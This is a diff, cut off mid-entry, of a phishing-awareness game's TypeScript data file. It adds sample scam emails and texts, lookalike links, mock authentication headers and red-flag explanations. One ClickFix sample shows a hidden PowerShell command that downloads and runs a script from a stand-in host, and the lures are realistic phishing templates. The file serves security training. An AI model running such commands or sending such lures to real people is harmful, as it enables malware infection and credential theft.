@@ -7,9 +7,16 @@ export interface MessageHeader {
   value: string;
   /**
    * Which lines mattered. Only highlighted after the player has decided: the
-   * text itself must stay neutral, because headers can be read before calling it.
+   * text itself must stay neutral, because it can be read before calling it.
    */
   tone?: "bad" | "good";
+}
+
+export interface MessageLink {
+  /** What the message shows you. */
+  text: string;
+  /** Where it really goes. Displayed only: nothing here is ever a live link. */
+  href: string;
 }
 
 export interface Message {
@@ -24,13 +31,84 @@ export interface Message {
   lever: string;
   from: string;
   subject?: string;
+  /** The short version on the notebook card. */
   body: string;
-  /** Text pushed far below the visible body by padding (content push-down). */
+  /** The whole message, shown in the full view. Falls back to `body`. */
+  paragraphs?: string[];
+  /** Text pushed far below the rest by blank padding. Full view only. */
   fold?: string;
-  /** Raw headers the player can pull up. The only tell on some mythics. */
-  headers?: MessageHeader[];
+  links?: MessageLink[];
+  attachments?: string[];
+  /** Every message has these, so having details is never itself a tell. */
+  headers: MessageHeader[];
   isPhish: boolean;
   flags: string[];
+}
+
+// ------------------------------------------------------------ detail builders
+// Every email carries the same rows in the same order, and every text the same
+// rows as other texts, so the shape of the details can't give the answer away.
+
+interface MailDetails {
+  /** Year the sending domain was registered, or "9 days ago". */
+  age: string;
+  returnPath: string;
+  replyTo?: string;
+  spf: string;
+  dkim: string;
+  dmarc: string;
+  received: string;
+  /** Row labels to mark as the giveaways once the player has decided. */
+  bad?: string[];
+  /** Row labels to mark as reassuring once the player has decided. */
+  good?: string[];
+}
+
+function mail(d: MailDetails): MessageHeader[] {
+  const rows: [string, string][] = [
+    ["Reply-To", d.replyTo ?? "same as sender"],
+    ["Return-Path", d.returnPath],
+    ["SPF", d.spf],
+    ["DKIM", d.dkim],
+    ["DMARC", d.dmarc],
+    ["Received from", d.received],
+    ["Domain registered", d.age],
+  ];
+  return rows.map(([label, value]) => ({
+    label,
+    value,
+    tone: d.bad?.includes(label) ? "bad" : d.good?.includes(label) ? "good" : undefined,
+  }));
+}
+
+/** A clean message from a domain that checks out on every line. */
+function clean(domain: string, age: string, received: string, returnPath?: string): MessageHeader[] {
+  return mail({
+    age,
+    returnPath: returnPath ?? `bounces@${domain}`,
+    spf: `pass (${domain})`,
+    dkim: `pass (${domain})`,
+    dmarc: "pass",
+    received,
+    good: ["SPF", "DKIM", "DMARC", "Domain registered"],
+  });
+}
+
+function text(sender: string, kind: string, carrierNote: string, opts?: { bad?: string[]; good?: string[] }): MessageHeader[] {
+  const rows: [string, string][] = [
+    ["Sender", sender],
+    ["Sender type", kind],
+    ["Carrier note", carrierNote],
+  ];
+  return rows.map(([label, value]) => ({
+    label,
+    value,
+    tone: opts?.bad?.includes(label) ? "bad" : opts?.good?.includes(label) ? "good" : undefined,
+  }));
+}
+
+function rows(list: [string, string, ("bad" | "good")?][]): MessageHeader[] {
+  return list.map(([label, value, tone]) => ({ label, value, tone }));
 }
 
 // All samples are inert training text: nothing here is ever rendered as a link.
@@ -45,7 +123,15 @@ export const MESSAGES: Message[] = [
     lever: "Fear",
     from: "paypal-secure-team1992@gmail-verify.ru",
     subject: "URGENT!!! YOU ACOUNT HAS BEEN SUSPENDID!!!",
-    body: "Dear Costumer, we has detect unusuall activitys on you PayPall acount. You must to verifiy you password and credit card numbr in 24 hour or acount will be DELETE forever!!! Clik here imediatly: http://paypa1-login.ru/verify",
+    body: "Dear Costumer, we has detect unusuall activitys on you PayPall acount. You must to verifiy you password and credit card numbr in 24 hour or acount will be DELETE forever!!!",
+    paragraphs: [
+      "Dear Costumer,",
+      "we has detect unusuall activitys on you PayPall acount. You must to verifiy you password and credit card numbr in 24 hour or acount will be DELETE forever!!!",
+      "Clik the secure link belove imediatly to restore acces.",
+      "Regards, PayPal Secuirty Departmant",
+    ],
+    links: [{ text: "RESTORE MY ACOUNT NOW", href: "http://paypa1-login.ru/verify" }],
+    headers: mail({ age: "6 days ago", returnPath: "bounce@gmail-verify.ru", spf: "none", dkim: "none", dmarc: "fail", received: "vps-1182.cheaphost.example", bad: ["Return-Path", "SPF", "DMARC", "Domain registered"] }),
     isPhish: true,
     flags: [
       "Sender is a random string on a .ru domain, nothing to do with PayPal",
@@ -62,6 +148,8 @@ export const MESSAGES: Message[] = [
     lever: "Greed",
     from: "+1 (555) 019-2231",
     body: "CONGRADULATIONS!! U hav WON $5OOO Walmrt gift crd!!! Clik http://bit.ly/fr33-m0ney NOW befor it expire!!! Reply STOP to cancle",
+    links: [{ text: "http://bit.ly/fr33-m0ney", href: "http://bit.ly/fr33-m0ney (a shortener: destination hidden)" }],
+    headers: text("+1 (555) 019-2231", "personal mobile number", "first message from this sender", { bad: ["Sender type", "Carrier note"] }),
     isPhish: true,
     flags: [
       "You can't win a contest you never entered",
@@ -78,7 +166,14 @@ export const MESSAGES: Message[] = [
     lever: "Greed",
     from: "prince.abubakar.official@freemail-bank.biz",
     subject: "Dearest Beloved Frend: $14.5 MILLION USD for You",
-    body: "Greetings in the name of God. I am Prince Abubakar and my late father has leave $14,500,000 in bank. I need trusted forigner to recieve funds and you will keep 30%. Kindly send you full name, bank acount and small transfer fee of $450 so we can begin.",
+    body: "Greetings in the name of God. I am Prince Abubakar and my late father has leave $14,500,000 in bank. I need trusted forigner to recieve funds and you will keep 30%.",
+    paragraphs: [
+      "Greetings in the name of God.",
+      "I am Prince Abubakar and my late father has leave $14,500,000 in bank. I need trusted forigner to recieve funds and you will keep 30%.",
+      "Kindly send you full name, bank acount and small transfer fee of $450 so we can begin. This is 100% risk free and legal.",
+      "Yours in faith, Prince Abubakar",
+    ],
+    headers: mail({ age: "2 months ago", returnPath: "prince.abubakar.official@freemail-bank.biz", replyTo: "abubakar.funds7@freemail-bank.biz", spf: "softfail", dkim: "none", dmarc: "none", received: "mx2.freemail-bank.biz", bad: ["Reply-To", "SPF", "Domain registered"] }),
     isPhish: true,
     flags: [
       "Classic advance-fee setup: pay a small fee to unlock a fortune",
@@ -94,7 +189,14 @@ export const MESSAGES: Message[] = [
     lever: "Urgency",
     from: "admin@micr0soft-0ffice-login.xyz",
     subject: "Micr0soft Offise 365 Pasword Expierd",
-    body: "You Offise pasword is expierd today. Log in with old pasword at link belove to keep you emails or they will be loose. Thank You, Microsoft Teem.",
+    body: "You Offise pasword is expierd today. Log in with old pasword at link belove to keep you emails or they will be loose.",
+    paragraphs: [
+      "Dear Offise User,",
+      "You Offise pasword is expierd today. Log in with old pasword at link belove to keep you emails or they will be loose.",
+      "Thank You, Microsoft Teem.",
+    ],
+    links: [{ text: "Keep My Pasword", href: "http://micr0soft-0ffice-login.xyz/keep" }],
+    headers: mail({ age: "11 days ago", returnPath: "admin@micr0soft-0ffice-login.xyz", spf: "pass (micr0soft-0ffice-login.xyz)", dkim: "none", dmarc: "none", received: "srv77.bulkmail.example", bad: ["Return-Path", "Domain registered"] }),
     isPhish: true,
     flags: [
       "Zeros in 'micr0soft' and a .xyz domain",
@@ -110,6 +212,8 @@ export const MESSAGES: Message[] = [
     lever: "Fear",
     from: "@instagram_copyrite_helpdesk22",
     body: "Hello Dear User!! You acount has copyrite violashun and will be band in 12 hour. Fill apeal form with you login informashun: insta-apeal-form.tk",
+    links: [{ text: "insta-apeal-form.tk", href: "http://insta-apeal-form.tk/login" }],
+    headers: rows([["Sender", "@instagram_copyrite_helpdesk22", "bad"], ["Account age", "3 days", "bad"], ["Verified badge", "no"], ["Followers", "4"]]),
     isPhish: true,
     flags: [
       "Platforms don't handle violations through a DM from a random handle",
@@ -128,7 +232,14 @@ export const MESSAGES: Message[] = [
     lever: "Curiosity",
     from: "ship-update@amazn-delivery.top",
     subject: "Your Amazon order has shipped",
-    body: "Hi Customer, your package can not deliver because address is incomplete. Kindly re-confirm your adress and pay the $1.99 redelivery fee in link to avoid return to sender.",
+    body: "Hi Customer, your package can not deliver because address is incomplete. Kindly re-confirm your adress and pay the $1.99 redelivery fee.",
+    paragraphs: [
+      "Hi Customer,",
+      "your package can not deliver because address is incomplete. Kindly re-confirm your adress and pay the $1.99 redelivery fee in link to avoid return to sender.",
+      "Thanks for shop with us.",
+    ],
+    links: [{ text: "Confirm delivery", href: "http://amazn-delivery.top/redeliver" }],
+    headers: mail({ age: "3 weeks ago", returnPath: "bounce@amazn-delivery.top", spf: "pass (amazn-delivery.top)", dkim: "none", dmarc: "none", received: "mail.amazn-delivery.top", bad: ["Return-Path", "Domain registered"] }),
     isPhish: true,
     flags: [
       "The title is believable, and that's the only thing that is",
@@ -146,6 +257,13 @@ export const MESSAGES: Message[] = [
     from: "no-reply@accounts-google.com",
     subject: "!!! IMPORTANT Act Now - Acount Compromise !!!",
     body: "Dear valued user, someone have tried to access you Google acount from Russia. You must confirm identity now or service will terminated.",
+    paragraphs: [
+      "Dear valued user,",
+      "someone have tried to access you Google acount from Russia. You must confirm identity now or service will terminated.",
+      "Google Account Team",
+    ],
+    links: [{ text: "Confirm Identity", href: "http://accounts-google.com/confirm" }],
+    headers: mail({ age: "5 weeks ago", returnPath: "no-reply@accounts-google.com", spf: "pass (accounts-google.com)", dkim: "pass (accounts-google.com)", dmarc: "pass", received: "smtp.accounts-google.com", bad: ["Return-Path", "Domain registered"] }),
     isPhish: true,
     flags: [
       "The address is close: but Google uses accounts.google.com, not accounts-google.com",
@@ -161,13 +279,21 @@ export const MESSAGES: Message[] = [
     lever: "Curiosity",
     from: "hr.benefits.department@outlook.com",
     subject: "FW: FW: open this asap",
-    body: "Hello, as part of our annual review we have updated the salary bands for all staff. Please review the attached document and confirm your details by Friday so that your adjustment can be processed in the next pay cycle.",
+    body: "Hello, as part of our annual review we have updated the salary bands for all staff. Please review the attached document and confirm your details by Friday.",
+    paragraphs: [
+      "Hello,",
+      "As part of our annual review we have updated the salary bands for all staff. Please review the attached document and confirm your details by Friday so that your adjustment can be processed in the next pay cycle.",
+      "If you have any questions, please reply to this message.",
+      "Kind regards, Human Resources",
+    ],
+    attachments: ["Salary_Bands_Review.docm"],
+    headers: mail({ age: "1996", returnPath: "hr.benefits.department@outlook.com", spf: "pass (outlook.com)", dkim: "pass (outlook.com)", dmarc: "pass", received: "outlook.com consumer mail", bad: ["Return-Path", "Received from"] }),
     isPhish: true,
     flags: [
       "The writing is clean and professional, the one thing that looks right",
       "Real HR doesn't send from a free outlook.com address",
       "'FW: FW: open this asap' isn't how payroll announces anything",
-      "Salary news is bait: you badly want to open it",
+      "A .docm attachment can carry macros, and salary news makes you want to open it",
     ],
   },
   {
@@ -178,6 +304,8 @@ export const MESSAGES: Message[] = [
     lever: "Urgency",
     from: "+1 (555) 014-8820",
     body: "USPS: Your package is held at our warehouse due to a missing house number. Update within 12 hours: usps-redelivery-center.info",
+    links: [{ text: "usps-redelivery-center.info", href: "http://usps-redelivery-center.info/update" }],
+    headers: text("+1 (555) 014-8820", "personal mobile number", "first message from this sender", { bad: ["Sender type", "Carrier note"] }),
     isPhish: true,
     flags: [
       "The wording is a good copy of a real delivery text",
@@ -195,6 +323,8 @@ export const MESSAGES: Message[] = [
     from: "Sticker on parking meter",
     subject: "PAY HERE - City Parking",
     body: "Scan to pay for parking: [QR code]. The label looks a little newer than the rest of the meter.",
+    links: [{ text: "Scanned QR code", href: "https://city-parking-pay.example/meter" }],
+    headers: rows([["Where it is", "parking meter, Main St"], ["City's payment site", "parking.yourcity.example"], ["Code points to", "city-parking-pay.example", "bad"], ["Printed on", "adhesive sticker over the label", "bad"]]),
     isPhish: true,
     flags: [
       "QR code is a sticker placed over the official signage",
@@ -213,17 +343,22 @@ export const MESSAGES: Message[] = [
     lever: "Flattery",
     from: "dana.whitlock@talentbridge-partners.com",
     subject: "Your network security project caught my eye",
-    body: "Hi, I came across your semester project on phishing awareness and really liked the approach you took with the game format. We're hiring security interns for summer and I think you'd be a strong fit. I've put the role details and pay range in a short doc. It just needs your university login to view, since it's shared through our campus partner portal.",
-    isPhish: true,
-    headers: [
-      { label: "SPF", value: "pass (talentbridge-partners.com)" },
-      { label: "Domain age", value: "registered 9 days ago", tone: "bad" },
+    body: "Hi, I came across your semester project on phishing awareness and really liked the approach you took with the game format. We're hiring security interns for summer and I think you'd be a strong fit.",
+    paragraphs: [
+      "Hi,",
+      "I came across your semester project on phishing awareness and really liked the approach you took with the game format. Teaching people through play is exactly the kind of thinking our clients are looking for.",
+      "We're hiring security interns for summer and I think you'd be a strong fit. I've put the role details and pay range in a short doc. It just needs your university login to view, since it's shared through our campus partner portal.",
+      "Would love to chat this week if you're open to it.",
+      "Dana Whitlock, Senior Technical Recruiter, TalentBridge Partners",
     ],
+    links: [{ text: "View role details", href: "https://talentbridge-partners.com/campus/sso" }],
+    headers: mail({ age: "9 days ago", returnPath: "dana.whitlock@talentbridge-partners.com", spf: "pass (talentbridge-partners.com)", dkim: "pass (talentbridge-partners.com)", dmarc: "pass", received: "mail.talentbridge-partners.com", bad: ["Domain registered"] }),
+    isPhish: true,
     flags: [
       "AI lets attackers personalize at scale, using what you post publicly",
       "Perfect grammar no longer means anything",
       "A recruiter doc has no reason to want your university login",
-      "SPF passes because they own the domain: it's only 9 days old",
+      "Every auth check passes because they own the domain: it's only 9 days old",
     ],
   },
   {
@@ -235,11 +370,14 @@ export const MESSAGES: Message[] = [
     from: "it-security@corp-mfa-enroll.com",
     subject: "Action required: MFA re-enrollment",
     body: "Our identity provider is migrating this week. Scan the code below with your phone to re-enroll your authenticator before Thursday. [QR code image]",
-    isPhish: true,
-    headers: [
-      { label: "From domain", value: "corp-mfa-enroll.com", tone: "bad" },
-      { label: "Links in body", value: "0 (1 inline image)", tone: "bad" },
+    paragraphs: [
+      "Hello,",
+      "Our identity provider is migrating this week. Scan the code below with your phone to re-enroll your authenticator before Thursday. Accounts that have not been re-enrolled will lose access to email and VPN.",
+      "[QR code image]",
+      "IT Security Operations",
     ],
+    headers: mail({ age: "2 weeks ago", returnPath: "it-security@corp-mfa-enroll.com", spf: "pass (corp-mfa-enroll.com)", dkim: "pass (corp-mfa-enroll.com)", dmarc: "pass", received: "mail.corp-mfa-enroll.com (external)", bad: ["Return-Path", "Received from", "Domain registered"] }),
+    isPhish: true,
     flags: [
       "A QR image has no link for mail scanners to check",
       "It moves you to your phone, outside work security tools",
@@ -254,14 +392,18 @@ export const MESSAGES: Message[] = [
     lever: "Curiosity",
     from: "sharepoint@sharepoint-docs-online.net",
     subject: "Q3 budget shared with you",
-    body: "Mark shared a file with you: Q3_Budget_Final.xlsx. Open in SharePoint. The link takes you to a Microsoft sign-in page that looks exactly as it always does, and it asks for your password and MFA code.",
-    isPhish: true,
-    headers: [
-      { label: "From domain", value: "sharepoint-docs-online.net", tone: "bad" },
-      { label: "Real service", value: "sharepointonline.com" },
+    body: "Mark shared a file with you: Q3_Budget_Final.xlsx. Open in SharePoint.",
+    paragraphs: [
+      "Mark shared a file with you.",
+      "Q3_Budget_Final.xlsx. \"Here's the latest, numbers changed on tab 3.\"",
+      "Open in SharePoint. You'll be asked to sign in with your work account and approve it with your authenticator.",
+      "Microsoft respects your privacy. To learn more, please read our Privacy Statement.",
     ],
+    links: [{ text: "Open in SharePoint", href: "https://login.sharepoint-docs-online.net/common/oauth2" }],
+    headers: mail({ age: "4 weeks ago", returnPath: "sharepoint@sharepoint-docs-online.net", spf: "pass (sharepoint-docs-online.net)", dkim: "pass (sharepoint-docs-online.net)", dmarc: "pass", received: "mta3.sharepoint-docs-online.net", bad: ["Return-Path", "Domain registered"] }),
+    isPhish: true,
     flags: [
-      "A reverse proxy shows the real login page and steals the session token",
+      "The link's host isn't Microsoft: a reverse proxy shows the real login page and steals the session token",
       "Normal MFA codes don't stop this; passkeys bound to the real domain do",
       "Check the address bar on any login you reached from an email",
     ],
@@ -274,6 +416,7 @@ export const MESSAGES: Message[] = [
     lever: "Exhaustion",
     from: "+1 (555) 010-4471",
     body: "Hi this is Tyler from the IT help desk. We're syncing your account and you'll get a few Duo prompts tonight. Just hit approve on the next one and they'll stop. Sorry for the spam!",
+    headers: text("+1 (555) 010-4471", "personal mobile number", "first message from this sender", { bad: ["Sender type"] }),
     isPhish: true,
     flags: [
       "They already have your password: the prompts are them trying to log in",
@@ -290,6 +433,7 @@ export const MESSAGES: Message[] = [
     from: "Pop-up on free-pdf-tools.example",
     subject: "Sign in with Google",
     body: "A login window opens with the Google logo and an address bar showing accounts.google.com, with a padlock. It looks exactly like the normal pop-up, and your password manager hasn't offered to fill it in.",
+    headers: rows([["Site you're on", "free-pdf-tools.example"], ["Address bar shows", "accounts.google.com"], ["Password manager", "no match found", "bad"], ["Drag it past the tab edge", "the window stops at the edge", "bad"]]),
     isPhish: true,
     flags: [
       "The fake window, and its fake address bar, are just HTML",
@@ -304,7 +448,11 @@ export const MESSAGES: Message[] = [
     technique: "Deepfake voice clone",
     lever: "Authority",
     from: "Voicemail: \"Dr. Reyes\" (your manager's voice)",
-    body: "Transcript: \"Hey, it's me. I'm boarding and I'm going to lose signal. The vendor's threatening to cut us off, so I need you to push that $8,400 payment through today. Details are in the text I'm sending you. Don't loop in finance, I'll sort it with them when I land.\"",
+    body: "Transcript: \"Hey, it's me. I'm boarding and I'm going to lose signal. The vendor's threatening to cut us off, so I need you to push that $8,400 payment through today. Don't loop in finance, I'll sort it with them when I land.\"",
+    paragraphs: [
+      "Transcript: \"Hey, it's me. I'm boarding and I'm going to lose signal. The vendor's threatening to cut us off, so I need you to push that $8,400 payment through today. Details are in the text I'm sending you. Don't loop in finance, I'll sort it with them when I land.\"",
+    ],
+    headers: rows([["Caller ID", "+1 (555) 017-3390", "bad"], ["Number on file for Dr. Reyes", "+1 (555) 012-6604"], ["Duration", "0:21"]]),
     isPhish: true,
     flags: [
       "A few seconds of public audio can clone someone's voice",
@@ -318,14 +466,121 @@ export const MESSAGES: Message[] = [
     channel: "Email",
     technique: "OAuth consent phishing",
     lever: "Convenience",
-    from: "no-reply@microsoft.com (via Teams)",
+    from: "no-reply@microsoft.com",
     subject: "Mail Reader Pro wants permission",
-    body: "You land on the Microsoft login at login.microsoftonline.com and sign in as usual. Then it asks: \"Mail Reader Pro would like to read your mail, access your files, and stay signed in.\" Accept / Cancel.",
+    body: "You sign in at the Microsoft login as usual. Then it asks: \"Mail Reader Pro would like to read your mail, access your files, and stay signed in.\" Accept / Cancel.",
+    paragraphs: [
+      "An app is asking for access to your account.",
+      "You sign in at login.microsoftonline.com as usual. Then it asks: \"Mail Reader Pro would like to read your mail, access your files, and stay signed in.\"",
+      "Publisher: unverified. Accept / Cancel.",
+    ],
+    links: [{ text: "Review permissions", href: "https://login.microsoftonline.com/common/oauth2/authorize?client_id=8f3c..." }],
+    headers: mail({ age: "1991", returnPath: "no-reply@microsoft.com", spf: "pass (microsoft.com)", dkim: "pass (microsoft.com)", dmarc: "pass", received: "mail-out.microsoft.com", good: ["SPF", "DKIM"] }),
     isPhish: true,
     flags: [
       "The page is real, but the app asking for access is the attacker's",
       "Accepting hands over a token that survives a password reset",
-      "Read permission screens: unknown app, broad access, no reason",
+      "Read permission screens: unknown app, unverified publisher, broad access",
+    ],
+  },
+  {
+    id: 308,
+    rarity: "epic",
+    channel: "Email",
+    technique: "Device code phishing",
+    lever: "Authority",
+    from: "conference-support@eventpass-meet.com",
+    subject: "Your access code for Thursday's security briefing",
+    body: "To join Thursday's briefing, go to microsoft.com/devicelogin and enter the code KX7-4QP9. Sign in with your work account when prompted.",
+    paragraphs: [
+      "Hi,",
+      "You're confirmed for Thursday's security briefing. To join, go to microsoft.com/devicelogin and enter the code KX7-4QP9, then sign in with your work account when prompted.",
+      "The code expires in 15 minutes, so please complete this as soon as you get this message.",
+      "EventPass Attendee Support",
+    ],
+    links: [{ text: "microsoft.com/devicelogin", href: "https://microsoft.com/devicelogin" }],
+    headers: mail({ age: "3 weeks ago", returnPath: "conference-support@eventpass-meet.com", spf: "pass (eventpass-meet.com)", dkim: "pass (eventpass-meet.com)", dmarc: "pass", received: "mail.eventpass-meet.com", bad: ["Domain registered"] }),
+    isPhish: true,
+    flags: [
+      "The link really is Microsoft, so link checks pass. The code is the trap",
+      "Entering it signs the attacker's device into your account",
+      "Only enter a device code for a device you are holding",
+    ],
+  },
+  {
+    id: 309,
+    rarity: "epic",
+    channel: "Teams chat",
+    technique: "Help desk impersonation",
+    lever: "Authority",
+    from: "IT Support Desk (External)",
+    body: "Hi, we've seen a spike of spam hitting your mailbox and we're working to stop it. Can you start a Quick Assist session so that I can apply the filter fix? It only takes five minutes.",
+    paragraphs: [
+      "Hi, we've seen a spike of spam hitting your mailbox and we're working to stop it. Can you start a Quick Assist session so that I can apply the filter fix? It only takes five minutes.",
+      "Just open Quick Assist from the Start menu and read me the code.",
+    ],
+    headers: rows([["Display name", "IT Support Desk"], ["Account", "itsupport@helpdesk-svc.onmicrosoft.com", "bad"], ["Organization", "external to your company", "bad"], ["Open ticket", "none on file", "bad"]]),
+    isPhish: true,
+    flags: [
+      "Attackers flood your inbox with spam first, then show up offering the fix",
+      "Quick Assist hands them your whole screen and keyboard",
+      "Teams labels them External: real IT is inside your org and has a ticket",
+    ],
+  },
+  {
+    id: 310,
+    rarity: "epic",
+    channel: "Web page",
+    technique: "ClickFix fake CAPTCHA",
+    lever: "Convenience",
+    from: "Verification page on a news site you clicked",
+    subject: "Verify you are human",
+    body: "To finish the check: press Windows + R, press Ctrl + V, then press Enter. The page says this confirms you're not a robot.",
+    headers: rows([["Site", "daily-gulf-report.example"], ["Clipboard contents", "powershell -w hidden -c iwr evil.example/a | iex", "bad"], ["Real CAPTCHAs ask for", "a click or an image choice"]]),
+    isPhish: true,
+    flags: [
+      "No CAPTCHA has ever needed the Run box",
+      "The page quietly copied a command to your clipboard",
+      "You run the malware yourself, so it slips past browser defenses",
+    ],
+  },
+  {
+    id: 311,
+    rarity: "epic",
+    channel: "Video call",
+    technique: "Deepfake video meeting",
+    lever: "Authority",
+    from: "Calendar invite: \"Urgent: Finance sync\"",
+    body: "Your CFO and two directors are on the call, faces and voices all familiar. They ask you to process a confidential transfer before the end of the day, and to keep it inside this group.",
+    headers: rows([["Meeting host", "cfo.office@zoom-rooms-secure.com", "bad"], ["Organizer's usual address", "m.ellison@yourcompany.com"], ["Others in the room", "all cameras on, no one answers small talk", "bad"]]),
+    isPhish: true,
+    flags: [
+      "Real-time deepfakes have fooled finance staff for millions in real cases",
+      "Secret, urgent, end of day: the pressure is the tell, not the face",
+      "Confirm by calling a known number, and use payment approval as normal",
+    ],
+  },
+  {
+    id: 312,
+    rarity: "epic",
+    channel: "Email",
+    technique: "SVG attachment smuggling",
+    lever: "Curiosity",
+    from: "remittance@northgate-supply.com",
+    subject: "Remittance advice: payment 88213",
+    body: "Please find attached the remittance advice for this month's payment. Contact accounts if the amounts differ from your records.",
+    paragraphs: [
+      "Hello,",
+      "Please find attached the remittance advice for this month's payment. Contact accounts if the amounts differ from your records.",
+      "Best regards, Accounts Payable, Northgate Supply",
+    ],
+    attachments: ["Remittance_88213.svg"],
+    headers: mail({ age: "2019", returnPath: "remittance@northgate-supply.com", spf: "softfail", dkim: "none", dmarc: "none", received: "relay9.bulk-send.example", bad: ["SPF", "DKIM", "Received from"] }),
+    isPhish: true,
+    flags: [
+      "An SVG looks like a picture but can run scripts when opened",
+      "Filters that block .exe and .html often let .svg through",
+      "Remittance slips come as PDFs, and SPF softfails here",
     ],
   },
 
@@ -339,12 +594,16 @@ export const MESSAGES: Message[] = [
     lever: "Trust",
     from: "jen.parker@summitlabsupply.com",
     subject: "RE: PO 44172: July invoice",
-    body: "Thanks for confirming the order, and yes the delivery date works on our end. One thing: our bank moved us to a new account after the merger, so please use the attached details for this and future payments. Accounting needs it applied before Friday's run. Thanks! Jen",
-    isPhish: true,
-    headers: [
-      { label: "SPF / DKIM", value: "pass (summitlabsupply.com)" },
-      { label: "Reply-To", value: "jen.parker@summitlabsupply.co", tone: "bad" },
+    body: "Thanks for confirming the order, and yes the delivery date works on our end. One thing: our bank moved us to a new account after the merger, so please use the attached details for this and future payments.",
+    paragraphs: [
+      "Thanks for confirming the order, and yes the delivery date works on our end.",
+      "One thing: our bank moved us to a new account after the merger, so please use the attached details for this and future payments. Accounting needs it applied before Friday's run.",
+      "Thanks! Jen",
+      "> On Mon, you wrote: Confirming PO 44172 for delivery the week of the 14th...",
     ],
+    attachments: ["New_Remit_Details.pdf"],
+    headers: mail({ age: "2011", returnPath: "jen.parker@summitlabsupply.com", replyTo: "jen.parker@summitlabsupply.co", spf: "pass (summitlabsupply.com)", dkim: "pass (summitlabsupply.com)", dmarc: "pass", received: "mail.summitlabsupply.com", bad: ["Reply-To"], good: ["SPF", "DKIM"] }),
+    isPhish: true,
     flags: [
       "A real mailbox was taken over, so it replies inside a real thread",
       "Replies quietly go to .co, not .com",
@@ -359,12 +618,14 @@ export const MESSAGES: Message[] = [
     lever: "Authority",
     from: "m.ellison@yourcornpany.com",
     subject: "Confidential: acquisition wire",
-    body: "I'm finishing the Halden deal and legal needs the deposit wired today. This is under NDA, so please don't discuss it until we announce Monday. Our counsel, Robert Haines, will email you the wire instructions. Let me know as soon as it's done. Thanks, Maria",
-    isPhish: true,
-    headers: [
-      { label: "From domain", value: "yourcornpany.com", tone: "bad" },
-      { label: "First seen", value: "first mail ever from this domain", tone: "bad" },
+    body: "I'm finishing the Halden deal and legal needs the deposit wired today. This is under NDA, so please don't discuss it until we announce Monday.",
+    paragraphs: [
+      "I'm finishing the Halden deal and legal needs the deposit wired today. This is under NDA, so please don't discuss it until we announce Monday.",
+      "Our counsel, Robert Haines, will email you the wire instructions. Let me know as soon as it's done.",
+      "Thanks, Maria",
     ],
+    headers: mail({ age: "2 weeks ago", returnPath: "m.ellison@yourcornpany.com", spf: "pass (yourcornpany.com)", dkim: "pass (yourcornpany.com)", dmarc: "pass", received: "mail.yourcornpany.com (external)", bad: ["Return-Path", "Received from", "Domain registered"] }),
+    isPhish: true,
     flags: [
       "'rn' looks like 'm' in most fonts: yourcornpany vs yourcompany",
       "Secrecy cuts out the people who'd catch it",
@@ -379,7 +640,14 @@ export const MESSAGES: Message[] = [
     lever: "Fear",
     from: "billing@secure-renewals-norton.com",
     subject: "Receipt: Annual protection plan $399.99",
-    body: "Thank you for your renewal. Your card ending in the number on file has been charged $399.99. Invoice attached. If you did not authorize this charge, call our billing team at (555) 013-7700 within 24 hours to cancel.",
+    body: "Thank you for your renewal. Your card on file has been charged $399.99. If you did not authorize this charge, call our billing team within 24 hours to cancel.",
+    paragraphs: [
+      "Thank you for your renewal.",
+      "Your card on file has been charged $399.99 for one year of protection on up to 5 devices. Your invoice is attached.",
+      "If you did not authorize this charge, call our billing team at (555) 013-7700 within 24 hours to cancel.",
+    ],
+    attachments: ["Invoice_771902.pdf"],
+    headers: mail({ age: "6 weeks ago", returnPath: "billing@secure-renewals-norton.com", spf: "pass (secure-renewals-norton.com)", dkim: "pass (secure-renewals-norton.com)", dmarc: "pass", received: "mail.secure-renewals-norton.com", bad: ["Return-Path", "Domain registered"] }),
     isPhish: true,
     flags: [
       "No links and no malware, so filters see nothing to flag",
@@ -395,16 +663,20 @@ export const MESSAGES: Message[] = [
     lever: "Authority",
     from: "dse@docusign.net",
     subject: "Complete with DocuSign: Updated_Direct_Deposit_Form.pdf",
-    body: "Payroll Department sent you a document to review and sign. Please confirm your direct deposit details, including your online banking sign-in, so that your next paycheck isn't delayed. REVIEW DOCUMENT.",
-    isPhish: true,
-    headers: [
-      { label: "SPF / DKIM", value: "pass (docusign.net)", tone: "good" },
-      { label: "Sender account", value: "payroll.dept.hr@gmail.com", tone: "bad" },
+    body: "Payroll Department sent you a document to review and sign. Please confirm your direct deposit details so that your next paycheck isn't delayed.",
+    paragraphs: [
+      "Payroll Department sent you a document to review and sign.",
+      "Please confirm your direct deposit details, including your online banking sign-in, so that your next paycheck isn't delayed.",
+      "Sent by: payroll.dept.hr@gmail.com",
+      "Do not share this email. This link contains a secure access code.",
     ],
+    links: [{ text: "REVIEW DOCUMENT", href: "https://na3.docusign.net/Signing/?ti=6f21..." }],
+    headers: mail({ age: "2003", returnPath: "bounces@docusign.net", spf: "pass (docusign.net)", dkim: "pass (docusign.net)", dmarc: "pass", received: "mail.docusign.net", good: ["SPF", "DKIM"] }),
+    isPhish: true,
     flags: [
-      "Real platform and valid signature, with an attacker's account behind it",
+      "Real platform and valid signature, with an attacker's Gmail account behind it",
       "Check who the sender is inside the service, not just the service",
-      "Payroll changes happen through your HR portal, not a surprise form",
+      "No real form asks for your bank sign-in. Payroll changes go through your HR portal",
     ],
   },
   {
@@ -415,21 +687,140 @@ export const MESSAGES: Message[] = [
     lever: "Urgency",
     from: "support@npmjs.help",
     subject: "Two-factor authentication update required",
-    body: "As part of ongoing security improvements, all maintainers must update their 2FA credentials by September 10. Accounts with outdated credentials will be temporarily locked starting that date. Update 2FA now.",
-    isPhish: true,
-    headers: [
-      { label: "From domain", value: "npmjs.help (registered 3 days ago)", tone: "bad" },
-      { label: "Real domain", value: "npmjs.com" },
+    body: "As part of ongoing security improvements, all maintainers must update their 2FA credentials by November 20. Accounts with outdated credentials will be temporarily locked.",
+    paragraphs: [
+      "Hi,",
+      "As part of ongoing security improvements, all maintainers must update their 2FA credentials by November 20. Accounts with outdated credentials will be temporarily locked starting that date to prevent unauthorized access.",
+      "Thanks for helping keep the registry safe.",
+      "The npm team",
     ],
+    links: [{ text: "Update 2FA now", href: "https://npmjs.help/settings/2fa" }],
+    headers: mail({ age: "3 days ago", returnPath: "support@npmjs.help", spf: "pass (npmjs.help)", dkim: "pass (npmjs.help)", dmarc: "pass", received: "mail.npmjs.help", bad: ["Return-Path", "Domain registered"] }),
+    isPhish: true,
     flags: [
       "Modeled on a real attack that compromised widely used npm packages",
       "Professional tone, and a believable policy with a real-sounding deadline",
       ".help is not npm: one maintainer's slip reaches millions of installs",
     ],
   },
+  {
+    id: 406,
